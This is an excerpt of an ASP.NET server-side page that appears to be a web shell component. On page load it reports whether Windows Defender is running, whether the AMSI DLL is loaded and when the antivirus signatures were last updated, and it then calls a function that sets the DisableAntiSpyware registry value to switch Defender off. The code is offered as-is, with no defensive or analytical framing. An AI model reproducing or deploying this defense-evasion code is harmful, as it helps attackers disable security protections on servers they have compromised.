...
<script runat="server">
    ...
    private bool IsWindowsDefenderRunning()
    {
        try
        {
            // Check Windows Defender status from the registry
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\"))
            {
                if (key != null)
                {
                    ...
                    {
                        return true; // Defender is enabled
                    }
                }
            }
        }
        ...
        return false; // Defender is disabled or error occurred
    }


    public static string GetAntivirusSignatureLastUpdated()
    {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    ...
                    Arguments = "-Command \"Get-MpComputerStatus | ConvertTo-Html\"",
            ...
            {
                return "Error: " + ex.Message; // Handle errors gracefully
            }
    }
    ...
    {
        var amsiDllName = "amsi.dll";
        var modules = Process.GetCurrentProcess().Modules.Cast<ProcessModule>();
        return modules.Any(m => m.ModuleName.Equals(amsiDllName, StringComparison.OrdinalIgnoreCase));
    }

    private bool IsAmsiLoaded()
    {
        // Check if "amsi.dll" is loaded using native API
    ...
    private void DisableWindowsDefender()
    {
        try
        {
            // Open the Defender registry key
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender", true);

            if (key != null)
            {
                key.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);  // Disable Windows Defender
                key.Close();
                Response.Write("Windows Defender disabled via registry. <br />");
            }
            else
            {
                Response.Write("Windows Defender registry key not found. <br />");
            }
        }
        catch (Exception ex)
        {
    ...
    protected void Page_Load(object sender, EventArgs e)
    {
        ...
        bool amsiLoaded = IsAmsiDllLoaded();
        Response.Write($"Is amsi.dll loaded? {amsiLoaded}");
        bool isDefenderRunning = IsWindowsDefenderRunning();
        bool isAmsiLoaded = IsAmsiLoaded();
        string defenderLastUpdate = GetAntivirusSignatureLastUpdated();
        DisableWindowsDefender();

        Response.Write("Windows Defender Running: " + isDefenderRunning + "<br>");
        Response.Write("AMSI Loaded: " + isAmsiLoaded + "<br>");
        Response.Write("Windows Defender Definitions Last Updated Date: " + defenderLastUpdate + "<br />");
